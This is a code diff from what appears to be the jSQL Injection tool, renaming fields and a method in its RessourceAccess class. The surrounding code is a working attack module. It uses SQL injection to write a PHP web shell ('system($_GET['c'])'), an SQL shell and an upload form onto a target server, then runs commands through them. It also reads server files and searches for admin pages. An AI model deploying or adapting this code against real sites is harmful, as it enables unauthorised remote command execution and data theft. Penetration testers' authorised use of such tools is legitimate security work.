@@ -36,12 +36,12 @@ import java.util.regex.Pattern;
 
 import org.apache.log4j.Logger;
 
-import com.jsql.exception.PreparationException;
-import com.jsql.exception.StoppableException;
-import com.jsql.model.bean.Request;
-import com.jsql.model.injection.InjectionModel;
-import com.jsql.model.injection.MediatorModel;
-import com.jsql.model.injection.suspendable.SuspendableGetRows;
+import com.jsql.model.InjectionModel;
+import com.jsql.model.MediatorModel;
+import com.jsql.model.accessible.bean.Request;
+import com.jsql.model.exception.PreparationException;
+import com.jsql.model.exception.StoppableException;
+import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.ConnectionUtil;
 import com.jsql.util.StringUtil;
 import com.jsql.view.scan.ScanListTerminal;
@@ -60,40 +60,40 @@ public class RessourceAccess {
     /**
      * File name for web shell.
      */
-    public static final String WEBSHELL_FILENAME
-            = "j" + InjectionModel.JSQLVERSION + ".tmp1.php";
+    public static final String FILENAME_WEBSHELL
+            = "j" + InjectionModel.VERSION_JSQL + ".tmp1.php";
     
     /**
      * File name for upload form.
      */
-    public static final String UPLOAD_FILENAME
-            = "j" + InjectionModel.JSQLVERSION + ".tmp2.php";
+    public static final String FILENAME_UPLOAD
+            = "j" + InjectionModel.VERSION_JSQL + ".tmp2.php";
     
     /**
      * File name for sql shell.
      */
-    public static final String SQLSHELL_FILENAME
-            = "j" + InjectionModel.JSQLVERSION + ".tmp3.php";
+    public static final String FILENAME_SQLSHELL
+            = "j" + InjectionModel.VERSION_JSQL + ".tmp3.php";
     
     /**
      * True if admin page sould stop, false otherwise.
      */
-    public static boolean endAdminSearch = false;
+    public static boolean isSearchAdminStopped = false;
     
     /**
      * True if scan list sould stop, false otherwise.
      */
-    public static boolean endScanList = false;
-    
-    /**
-     * True if current user has right to read file. 
-     */
-    public static boolean hasFileRight = false;
+    public static boolean isScanStopped = false;
     
     /**
      * True if file search must stop, false otherwise.
      */
-    public static boolean endFileSearch = false;
+    public static boolean isSearchFileStopped = false;
+    
+    /**
+     * True if current user has right to read file. 
+     */
+    public static boolean isReadingAllowed = false;
 
     /**
      * Check if every page in the list responds 200 OK.
@@ -129,7 +129,7 @@ public class RessourceAccess {
         int submittedTasks = directoryNames.size() * pageNames.size();
         for (
             int tasksHandled = 0; 
-            tasksHandled < submittedTasks && !RessourceAccess.endAdminSearch; 
+            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped; 
             tasksHandled++
         ) {
             try {
@@ -154,7 +154,7 @@ public class RessourceAccess {
             LOGGER.error(e, e);
         }
 
-        RessourceAccess.endAdminSearch = false;
+        RessourceAccess.isSearchAdminStopped = false;
 
         if (nbAdminPagesFound > 0) {
             LOGGER.debug("Admin page(s) found: " + nbAdminPagesFound + "/" + submittedTasks);
@@ -175,7 +175,7 @@ public class RessourceAccess {
      * @throws StoppableException
      */
     public static void createWebShell(String pathShell, String urlShell) throws PreparationException, StoppableException {
-        if (!RessourceAccess.checkFilePrivilege()) {
+        if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
 
@@ -184,12 +184,12 @@ public class RessourceAccess {
             pathShellFixed += "/";
         }
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + WEBSHELL_FILENAME)
+            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + FILENAME_WEBSHELL)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + WEBSHELL_FILENAME),
+            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
             sourcePage,
             false,
             1,
@@ -197,7 +197,7 @@ public class RessourceAccess {
         );
 
         if ("".equals(hexResult)) {
-            MediatorModel.model().sendResponseFromSite("Can't find web shell at "+ pathShellFixed + WEBSHELL_FILENAME, sourcePage[0].trim());
+            MediatorModel.model().sendResponseFromSite("Can't find web shell at "+ pathShellFixed + FILENAME_WEBSHELL, sourcePage[0].trim());
             return;
         }
 
@@ -226,7 +226,7 @@ public class RessourceAccess {
         URLConnection connection;
         String result = "";
         try {
-            String url = urlShell + WEBSHELL_FILENAME + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1");
+            String url = urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1");
             connection = new URL(url).openConnection();
             connection.setReadTimeout(60000);
             connection.setConnectTimeout(60000);
@@ -280,7 +280,7 @@ public class RessourceAccess {
      * @throws StoppableException
      */
     public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws PreparationException, StoppableException {
-        if (!RessourceAccess.checkFilePrivilege()) {
+        if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
         
@@ -300,12 +300,12 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile(s, pathShellFixed + SQLSHELL_FILENAME)
+            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile(s, pathShellFixed + FILENAME_SQLSHELL)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + SQLSHELL_FILENAME),
+            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
             sourcePage,
             false,
             1,
@@ -313,7 +313,7 @@ public class RessourceAccess {
         );
 
         if ("".equals(hexResult)) {
-            MediatorModel.model().sendResponseFromSite("Can't find SQL shell at " + pathShellFixed + SQLSHELL_FILENAME, sourcePage[0].trim());
+            MediatorModel.model().sendResponseFromSite("Can't find SQL shell at " + pathShellFixed + FILENAME_SQLSHELL, sourcePage[0].trim());
             return;
         }
         
@@ -344,7 +344,7 @@ public class RessourceAccess {
         URLConnection connection;
         String result = "";
         try {
-            String url = urlShell + SQLSHELL_FILENAME +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password;
+            String url = urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password;
             connection = new URL(url).openConnection();
             connection.setReadTimeout(60000);
             connection.setConnectTimeout(60000);
@@ -397,7 +397,7 @@ public class RessourceAccess {
      * @throws StoppableException
      */
     public static void uploadFile(String pathFile, String urlFile, File file) throws PreparationException, StoppableException {
-        if (!RessourceAccess.checkFilePrivilege()) {
+        if (!RessourceAccess.isReadingAllowed()) {
             return;
         }
         
@@ -409,12 +409,12 @@ public class RessourceAccess {
         }
         
         MediatorModel.model().injectWithoutIndex(
-            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShell +"<iLQS>", pathFileFixed + UPLOAD_FILENAME)
+            MediatorModel.model().currentVendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShell +"<iLQS>", pathFileFixed + FILENAME_UPLOAD)
         );
 
         String[] sourcePage = {""};
         String hexResult = new SuspendableGetRows().run(
-            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathFileFixed + UPLOAD_FILENAME),
+            MediatorModel.model().currentVendor.getValue().getSqlReadFile(pathFileFixed + FILENAME_UPLOAD),
             sourcePage,
             false,
             1,
@@ -422,7 +422,7 @@ public class RessourceAccess {
         );
 
         if ("".equals(hexResult)) {
-            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathFileFixed + UPLOAD_FILENAME, sourcePage[0].trim());
+            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathFileFixed + FILENAME_UPLOAD, sourcePage[0].trim());
             return;
         }
 
@@ -438,7 +438,7 @@ public class RessourceAccess {
             InputStream is = null;
 
             try (InputStream imgIs = new FileInputStream(file)) {
-                URL url2 = new URL(url +"/"+ UPLOAD_FILENAME);
+                URL url2 = new URL(url +"/"+ FILENAME_UPLOAD);
                 conn = url2.openConnection();
                 conn.setDoOutput(true);
 
@@ -532,7 +532,7 @@ public class RessourceAccess {
      * @throws PreparationException
      * @throws StoppableException
      */
-    public static boolean checkFilePrivilege() throws PreparationException, StoppableException {
+    public static boolean isReadingAllowed() throws PreparationException, StoppableException {
         String[] sourcePage = {""};
 
         String hexResult = new SuspendableGetRows().run(
@@ -548,21 +548,21 @@ public class RessourceAccess {
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
             MediatorModel.model().interact(request);
-            hasFileRight = false;
+            isReadingAllowed = false;
         } else if ("false".equals(hexResult)) {
             LOGGER.warn("No FILE privilege");
             Request request = new Request();
             request.setMessage("MarkFileSystemInvulnerable");
             MediatorModel.model().interact(request);
-            hasFileRight = false;
+            isReadingAllowed = false;
         } else {
             Request request = new Request();
             request.setMessage("MarkFileSystemVulnerable");
             MediatorModel.model().interact(request);
-            hasFileRight = true;
+            isReadingAllowed = true;
         }
         
-        return hasFileRight;
+        return isReadingAllowed;
     }
     
     /**
@@ -572,7 +572,7 @@ public class RessourceAccess {
      * @throws StoppableException
      */
     public static void readFile(List<ListItem> pathsFiles) throws PreparationException, StoppableException {
-        if (!checkFilePrivilege()) {
+        if (!isReadingAllowed()) {
             return;
         }
 
@@ -586,7 +586,7 @@ public class RessourceAccess {
 
         List<String> duplicate = new ArrayList<>();
         int submittedTasks = pathsFiles.size();
-        for (int tasksHandled = 0; tasksHandled < submittedTasks && !RessourceAccess.endFileSearch; tasksHandled++) {
+        for (int tasksHandled = 0; tasksHandled < submittedTasks && !RessourceAccess.isSearchFileStopped; tasksHandled++) {
             try {
                 CallableFile currentCallable = taskCompletionService.take().get();
                 if (!"".equals(currentCallable.getFileSource())) {
@@ -618,7 +618,7 @@ public class RessourceAccess {
             LOGGER.error(e, e);
         }
 
-        RessourceAccess.endFileSearch = false;
+        RessourceAccess.isSearchFileStopped = false;
 
         if (nb > 0) {
             LOGGER.debug("File(s) found: " + nb + "/" + submittedTasks);
